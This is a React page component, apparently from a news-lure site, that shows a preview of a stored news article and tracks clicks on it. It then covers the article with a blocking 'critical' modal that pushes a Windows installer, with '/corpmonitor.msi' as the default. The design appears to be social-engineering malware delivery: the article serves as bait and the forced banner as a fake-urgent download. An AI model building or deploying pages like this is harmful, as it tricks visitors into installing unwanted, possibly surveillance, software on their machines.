import { useParams } from 'react-router-dom';
import { useEffect } from 'react';
import { CriticalBanner } from "@/components/noticia/CriticalBanner";
import { NewsPreview } from "@/components/noticia/NewsPreview";
import { useNewsBlock } from "@/hooks/useNewsBlock";
import { Loader2 } from 'lucide-react';

const Noticia = () => {
  const { id } = useParams<{ id: string }>();
  const { data: news, isLoading, incrementClick } = useNewsBlock(id);

  // Incrementar contador quando notícia for carregada
  useEffect(() => {
    if (news && news.active && id) {
      incrementClick(id);
    }
  }, [news?.id]);

  if (isLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <Loader2 className="w-8 h-8 animate-spin text-primary" />
      </div>
    );
  }

  if (!news || !news.active) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <div className="text-center">
          <h1 className="text-2xl font-bold mb-2">Notícia não encontrada</h1>
          <p className="text-muted-foreground">Esta notícia não está disponível ou foi removida.</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background relative">
      <div className="max-w-5xl mx-auto p-4 py-8">
        <NewsPreview
          title={news.title}
          description={news.description ?? undefined}
          source={news.source}
          imageUrl={news.image_url ?? undefined}
          publishedDate={news.published_date ?? undefined}
          author={news.author ?? undefined}
          category={news.category ?? undefined}
          url={news.url}
        />
      </div>
      
      {/* Modal bloqueante sobreposto */}
      <CriticalBanner installerUrl={news.installer_url ?? '/corpmonitor.msi'} />
    </div>
  );
};

export default Noticia;
